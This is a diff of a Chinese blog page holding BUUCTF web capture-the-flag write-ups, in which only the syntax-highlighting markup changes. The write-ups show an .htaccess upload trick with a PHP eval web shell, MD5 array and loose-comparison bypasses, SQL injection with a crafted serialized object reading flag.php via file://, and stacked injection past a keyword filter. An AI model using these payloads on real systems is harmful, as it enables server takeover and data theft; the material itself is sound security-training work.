@@ -201,11 +201,11 @@
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">GIF89a
-&lt;FilesMatch &#34;leo.jpg&#34;&gt;
-SetHandler application/x-httpd-php
-&lt;/FilesMatch&gt;
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GIF89a
+</span></span><span class="line"><span class="cl">&lt;FilesMatch &#34;leo.jpg&#34;&gt;
+</span></span><span class="line"><span class="cl">SetHandler application/x-httpd-php
+</span></span><span class="line"><span class="cl">&lt;/FilesMatch&gt;
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>这一步需要用Burp拦截请求，手动修改<code>Content-Type: application/octet-stream</code>为<code>Content-Type: image/png</code>。</p>
 <p>然后上传<code>leo.jpg</code>，其中写入</p>
@@ -215,9 +215,9 @@ SetHandler application/x-httpd-php
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">GIF89a</span>
-<span class="o">&lt;</span><span class="nx">script</span> <span class="nx">language</span><span class="o">=</span><span class="s1">&#39;php&#39;</span><span class="o">&gt;@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ye&#39;</span><span class="p">]);</span><span class="o">&lt;/</span><span class="nx">script</span><span class="o">&gt;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">GIF89a</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">language</span><span class="o">=</span><span class="s1">&#39;php&#39;</span><span class="o">&gt;@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ye&#39;</span><span class="p">]);</span><span class="o">&lt;/</span><span class="nx">script</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>蚁剑连接即可。</p>
 <h2 id="0x01-mrctf2020ez_bypass">0x01 [MRCTF2020]Ez_bypass</h2>
@@ -268,47 +268,47 @@ SetHandler application/x-httpd-php
 </span><span class="lnt">40
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html">I put something in F12 for you
-include &#39;flag.php&#39;;
-$flag=&#39;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}&#39;;
-if(isset($_GET[&#39;gg&#39;])<span class="err">&amp;&amp;</span>isset($_GET[&#39;id&#39;])) {
-    $id=$_GET[&#39;id&#39;];
-    $gg=$_GET[&#39;gg&#39;];
-    if (md5($id) === md5($gg) <span class="err">&amp;&amp;</span> $id !== $gg) {
-        echo &#39;You got the first step&#39;;
-        if(isset($_POST[&#39;passwd&#39;])) {
-            $passwd=$_POST[&#39;passwd&#39;];
-            if (!is_numeric($passwd))
-            {
-                 if($passwd==1234567)
-                 {
-                     echo &#39;Good Job!&#39;;
-                     highlight_file(&#39;flag.php&#39;);
-                     die(&#39;By Retr_0&#39;);
-                 }
-                 else
-                 {
-                     echo &#34;can you think twice??&#34;;
-                 }
-            }
-            else{
-                echo &#39;You can not get it !&#39;;
-            }
-
-        }
-        else{
-            die(&#39;only one way to get the flag&#39;);
-        }
-}
-    else {
-        echo &#34;You are not a real hacker!&#34;;
-    }
-}
-else{
-    die(&#39;Please input first&#39;);
-}
-}Please input first
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">I put something in F12 for you
+</span></span><span class="line"><span class="cl">include &#39;flag.php&#39;;
+</span></span><span class="line"><span class="cl">$flag=&#39;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}&#39;;
+</span></span><span class="line"><span class="cl">if(isset($_GET[&#39;gg&#39;])<span class="err">&amp;&amp;</span>isset($_GET[&#39;id&#39;])) {
+</span></span><span class="line"><span class="cl">    $id=$_GET[&#39;id&#39;];
+</span></span><span class="line"><span class="cl">    $gg=$_GET[&#39;gg&#39;];
+</span></span><span class="line"><span class="cl">    if (md5($id) === md5($gg) <span class="err">&amp;&amp;</span> $id !== $gg) {
+</span></span><span class="line"><span class="cl">        echo &#39;You got the first step&#39;;
+</span></span><span class="line"><span class="cl">        if(isset($_POST[&#39;passwd&#39;])) {
+</span></span><span class="line"><span class="cl">            $passwd=$_POST[&#39;passwd&#39;];
+</span></span><span class="line"><span class="cl">            if (!is_numeric($passwd))
+</span></span><span class="line"><span class="cl">            {
+</span></span><span class="line"><span class="cl">                 if($passwd==1234567)
+</span></span><span class="line"><span class="cl">                 {
+</span></span><span class="line"><span class="cl">                     echo &#39;Good Job!&#39;;
+</span></span><span class="line"><span class="cl">                     highlight_file(&#39;flag.php&#39;);
+</span></span><span class="line"><span class="cl">                     die(&#39;By Retr_0&#39;);
+</span></span><span class="line"><span class="cl">                 }
+</span></span><span class="line"><span class="cl">                 else
+</span></span><span class="line"><span class="cl">                 {
+</span></span><span class="line"><span class="cl">                     echo &#34;can you think twice??&#34;;
+</span></span><span class="line"><span class="cl">                 }
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">            else{
+</span></span><span class="line"><span class="cl">                echo &#39;You can not get it !&#39;;
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        else{
+</span></span><span class="line"><span class="cl">            die(&#39;only one way to get the flag&#39;);
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">    else {
+</span></span><span class="line"><span class="cl">        echo &#34;You are not a real hacker!&#34;;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">else{
+</span></span><span class="line"><span class="cl">    die(&#39;Please input first&#39;);
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">}Please input first
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>存在两层需要绕过</p>
 <p>第一层，满足两个get请求参数的md5强相等但是参数不相等，这显然是传数组呀。需要记住的是，对于php后端，get请求传递数组的方式为<code>/?a[]=1</code>，这样相当于传递了<code>a = [1]</code>，<code>/?a[]=1&amp;a[]=2</code>则相当于传递了<code>a = [1, 2]</code>。</p>
@@ -406,51 +406,51 @@ else{
 </span><span class="lnt">44
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-
-
-<span class="k">class</span> <span class="nc">UserInfo</span>
-<span class="p">{</span>
-    <span class="k">public</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
-    <span class="k">public</span> <span class="nv">$age</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-    <span class="k">public</span> <span class="nv">$blog</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
-
-    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$age</span><span class="p">,</span> <span class="nv">$blog</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$age</span><span class="p">;</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">blog</span> <span class="o">=</span> <span class="nv">$blog</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="k">function</span> <span class="nf">get</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">();</span>
-
-        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
-        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
-        <span class="nv">$output</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
-        <span class="nv">$httpCode</span> <span class="o">=</span> <span class="nx">curl_getinfo</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLINFO_HTTP_CODE</span><span class="p">);</span>
-        <span class="k">if</span><span class="p">(</span><span class="nv">$httpCode</span> <span class="o">==</span> <span class="mi">404</span><span class="p">)</span> <span class="p">{</span>
-            <span class="k">return</span> <span class="mi">404</span><span class="p">;</span>
-        <span class="p">}</span>
-        <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
-
-        <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="k">public</span> <span class="k">function</span> <span class="nf">getBlogContents</span> <span class="p">()</span>
-    <span class="p">{</span>
-        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">blog</span><span class="p">);</span>
-    <span class="p">}</span>
-
-    <span class="k">public</span> <span class="k">function</span> <span class="nf">isValidBlog</span> <span class="p">()</span>
-    <span class="p">{</span>
-        <span class="nv">$blog</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">blog</span><span class="p">;</span>
-        <span class="k">return</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&#34;</span><span class="p">,</span> <span class="nv">$blog</span><span class="p">);</span>
-    <span class="p">}</span>
-
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">UserInfo</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$age</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$blog</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$age</span><span class="p">,</span> <span class="nv">$blog</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$age</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">blog</span> <span class="o">=</span> <span class="nv">$blog</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">get</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$output</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$httpCode</span> <span class="o">=</span> <span class="nx">curl_getinfo</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLINFO_HTTP_CODE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$httpCode</span> <span class="o">==</span> <span class="mi">404</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">404</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getBlogContents</span> <span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">blog</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">isValidBlog</span> <span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$blog</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">blog</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&#34;</span><span class="p">,</span> <span class="nv">$blog</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>再配合输入<code>/view.php?no=-1 union/**/select 1,group_concat(data),3,4 from users#</code>，会得到</p>
 <div class="highlight"><div class="chroma">
@@ -458,8 +458,8 @@ else{
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:4:&#34;test&#34;;s:3:&#34;age&#34;;i:14;s:4:&#34;blog&#34;;s:9:&#34;dtest.com&#34;;},O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:3:&#34;leo&#34;;s:3:&#34;age&#34;;i:22;s:4:&#34;blog&#34;;s:15:&#34;1iu2y.github.io&#34;;},O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:40:&#34;tes2&#34;;s:3:&#34;age&#34;;i:14;s:4:&#34;blog&#34;;s:9:&#34;fwfwf.com&#34;;}
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:4:&#34;test&#34;;s:3:&#34;age&#34;;i:14;s:4:&#34;blog&#34;;s:9:&#34;dtest.com&#34;;},O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:3:&#34;leo&#34;;s:3:&#34;age&#34;;i:22;s:4:&#34;blog&#34;;s:15:&#34;1iu2y.github.io&#34;;},O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:40:&#34;tes2&#34;;s:3:&#34;age&#34;;i:14;s:4:&#34;blog&#34;;s:9:&#34;fwfwf.com&#34;;}
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>这刚好就是<code>UserInfo</code>的序列化结果。所以可以猜到view.php的逻辑就是根据<code>no</code>查询，再将查询结果的<code>data</code>栏进行反序列化，得到<code>blog</code>内容，然后调用<code>getblogcontents()</code>。所以我们通过修改反序列化的输入，就能够绕过<code>isValidBlog()</code>的判断。</p>
 <p>而我们之前得到的列名结果为<code>no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</code>，<code>data</code>在第四列，所以构造的反序列化字符串应该放在select的第四个位置。再结合php伪协议<code>file://</code>，以及<code>/flag.php</code>的请求结果为200（理论上来说这一点在扫描的时候就能够得知），可以构造以下payload：</p>
@@ -468,8 +468,8 @@ else{
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">/view.php?no=-1 union/**/select 1,2,3,&#39;O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:1:&#34;a&#34;;s:3:&#34;age&#34;;i:10;s:4:&#34;blog&#34;;s:29:&#34;file:///var/www/html/flag.php&#34;;}&#39;#
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/view.php?no=-1 union/**/select 1,2,3,&#39;O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:1:&#34;a&#34;;s:3:&#34;age&#34;;i:10;s:4:&#34;blog&#34;;s:29:&#34;file:///var/www/html/flag.php&#34;;}&#39;#
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>查看源码得到base64编码。</p>
 <p><figure><a class="lightgallery" href="/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/image-20210825140012191.png" title="image-20210825140012191" data-thumbnail="/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/image-20210825140012191.png" data-sub-html="<h2>base64</h2><p>image-20210825140012191</p>">
@@ -491,11 +491,11 @@ else{
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-
-<span class="nv">$flag</span> <span class="o">=</span> <span class="s2">&#34;flag{340198f3-c539-4aac-8a0c-5c6759155623}&#34;</span><span class="p">;</span>
-<span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$flag</span> <span class="o">=</span> <span class="s2">&#34;flag{340198f3-c539-4aac-8a0c-5c6759155623}&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="总结">总结</h3>
 <p>这题结合了<strong>get请求注入</strong>、<strong>目录扫描</strong>、<strong>反序列化</strong>、<strong>php伪协议</strong>多个要素，是一道很有意思的题，也是目前为止我刷buuoj过程中碰到的最难的web题。</p>
@@ -526,27 +526,27 @@ else{
 </span><span class="lnt">20
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">array(2) {
-  [0]=&gt;
-  string(1) &#34;1&#34;
-  [1]=&gt;
-  string(7) &#34;hahahah&#34;
-}
-
-array(2) {
-  [0]=&gt;
-  string(1) &#34;2&#34;
-  [1]=&gt;
-  string(12) &#34;miaomiaomiao&#34;
-}
-
-array(2) {
-  [0]=&gt;
-  string(6) &#34;114514&#34;
-  [1]=&gt;
-  string(2) &#34;ys&#34;
-}
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">array(2) {
+</span></span><span class="line"><span class="cl">  [0]=&gt;
+</span></span><span class="line"><span class="cl">  string(1) &#34;1&#34;
+</span></span><span class="line"><span class="cl">  [1]=&gt;
+</span></span><span class="line"><span class="cl">  string(7) &#34;hahahah&#34;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">array(2) {
+</span></span><span class="line"><span class="cl">  [0]=&gt;
+</span></span><span class="line"><span class="cl">  string(1) &#34;2&#34;
+</span></span><span class="line"><span class="cl">  [1]=&gt;
+</span></span><span class="line"><span class="cl">  string(12) &#34;miaomiaomiao&#34;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">array(2) {
+</span></span><span class="line"><span class="cl">  [0]=&gt;
+</span></span><span class="line"><span class="cl">  string(6) &#34;114514&#34;
+</span></span><span class="line"><span class="cl">  [1]=&gt;
+</span></span><span class="line"><span class="cl">  string(2) &#34;ys&#34;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><code>1' union select 1,2,3 #</code>发现<code>set</code>/<code>select</code>等不论大小写都被过滤了。</p>
 <div class="highlight"><div class="chroma">
@@ -554,8 +554,8 @@ array(2) {
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">return preg_match(&#34;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&#34;,$inject);
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">return preg_match(&#34;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&#34;,$inject);
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>这又难到了我，看了一下报错注入也需要<code>select</code>啊，怎么操作呢？查阅博客后回想起，注入不是只有<strong>union联合注入</strong>、<strong>updataxml报错注入</strong>等，还有<strong>堆叠注入</strong>啊。</p>
 <p><code>1';show tables;#</code>查看所有表</p>
@@ -580,24 +580,24 @@ array(2) {
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">array(2) {
-  [0]=&gt;
-  string(1) &#34;1&#34;
-  [1]=&gt;
-  string(7) &#34;hahahah&#34;
-}
-------------------------
-array(1) {
-  [0]=&gt;
-  string(8) &#34;FlagHere&#34;
-}
-
-array(1) {
-  [0]=&gt;
-  string(5) &#34;words&#34;
-}
-------------------------
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">array(2) {
+</span></span><span class="line"><span class="cl">  [0]=&gt;
+</span></span><span class="line"><span class="cl">  string(1) &#34;1&#34;
+</span></span><span class="line"><span class="cl">  [1]=&gt;
+</span></span><span class="line"><span class="cl">  string(7) &#34;hahahah&#34;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">------------------------
+</span></span><span class="line"><span class="cl">array(1) {
+</span></span><span class="line"><span class="cl">  [0]=&gt;
+</span></span><span class="line"><span class="cl">  string(8) &#34;FlagHere&#34;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">array(1) {
+</span></span><span class="line"><span class="cl">  [0]=&gt;
+</span></span><span class="line"><span class="cl">  string(5) &#34;words&#34;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">------------------------
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><code>1';desc FalgHere;#</code>查看<code>FlagHere</code>表的结构</p>
 <div class="highlight"><div class="chroma">
@@ -626,29 +626,29 @@ array(1) {
 </span><span class="lnt">22
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">array(2) {
-  [0]=&gt;
-  string(1) &#34;1&#34;
-  [1]=&gt;
-  string(7) &#34;hahahah&#34;
-}
-------------------------
-array(6) {
-  [0]=&gt;
-  string(4) &#34;flag&#34;
-  [1]=&gt;
-  string(12) &#34;varchar(100)&#34;
-  [2]=&gt;
-  string(2) &#34;NO&#34;
-  [3]=&gt;
-  string(0) &#34;&#34;
-  [4]=&gt;
-  NULL
-  [5]=&gt;
-  string(0) &#34;&#34;
-}
-------------------------
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">array(2) {
+</span></span><span class="line"><span class="cl">  [0]=&gt;
+</span></span><span class="line"><span class="cl">  string(1) &#34;1&#34;
+</span></span><span class="line"><span class="cl">  [1]=&gt;
+</span></span><span class="line"><span class="cl">  string(7) &#34;hahahah&#34;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">------------------------
+</span></span><span class="line"><span class="cl">array(6) {
+</span></span><span class="line"><span class="cl">  [0]=&gt;
+</span></span><span class="line"><span class="cl">  string(4) &#34;flag&#34;
+</span></span><span class="line"><span class="cl">  [1]=&gt;
+</span></span><span class="line"><span class="cl">  string(12) &#34;varchar(100)&#34;
+</span></span><span class="line"><span class="cl">  [2]=&gt;
+</span></span><span class="line"><span class="cl">  string(2) &#34;NO&#34;
+</span></span><span class="line"><span class="cl">  [3]=&gt;
+</span></span><span class="line"><span class="cl">  string(0) &#34;&#34;
+</span></span><span class="line"><span class="cl">  [4]=&gt;
+</span></span><span class="line"><span class="cl">  NULL
+</span></span><span class="line"><span class="cl">  [5]=&gt;
+</span></span><span class="line"><span class="cl">  string(0) &#34;&#34;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">------------------------
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>flag就在这里了。接下来可以用<code>prepare</code>设置计划任务，也可以<code>rename</code>更改表名，但是这些关键字都被过滤了。所以这里需使用<code>handler</code>来实现注入。😶</p>
 <blockquote>
@@ -674,19 +674,19 @@ array(6) {
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">array(2) {
-  [0]=&gt;
-  string(1) &#34;1&#34;
-  [1]=&gt;
-  string(7) &#34;hahahah&#34;
-}
-------------------------
-array(1) {
-  [0]=&gt;
-  string(42) &#34;flag{eb3f6fba-9f4e-402a-9252-c258ce1fe7cb}&#34;
-}
-------------------------
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">array(2) {
+</span></span><span class="line"><span class="cl">  [0]=&gt;
+</span></span><span class="line"><span class="cl">  string(1) &#34;1&#34;
+</span></span><span class="line"><span class="cl">  [1]=&gt;
+</span></span><span class="line"><span class="cl">  string(7) &#34;hahahah&#34;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">------------------------
+</span></span><span class="line"><span class="cl">array(1) {
+</span></span><span class="line"><span class="cl">  [0]=&gt;
+</span></span><span class="line"><span class="cl">  string(42) &#34;flag{eb3f6fba-9f4e-402a-9252-c258ce1fe7cb}&#34;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">------------------------
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="参考链接-1">参考链接</h3>
 <ul>
@@ -709,10 +709,10 @@ array(1) {
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;FilesMatch &#34;leo.jpg&#34;&gt;
-SetHandler application/x-httpd-php
-&lt;/FilesMatch&gt;
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;FilesMatch &#34;leo.jpg&#34;&gt;
+</span></span><span class="line"><span class="cl">SetHandler application/x-httpd-php
+</span></span><span class="line"><span class="cl">&lt;/FilesMatch&gt;
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>直接上传当然是不行的啦，得拦截然后修改为<code>Content-Type: image/jpeg</code>。然后常规操作，上传图片马再连接即可。</p>
 <p>这里比较搞的一点是，我尝试了<code>Content-Type: image/jpg</code>和<code>Content-Type: image/png</code>，发现都不行，还以为这题又是一种新的绕过方式。再看了别人博客之后才发现，原来就是个<code>jpeg</code>的问题&hellip;</p>
@@ -753,8 +753,8 @@ SetHandler application/x-httpd-php
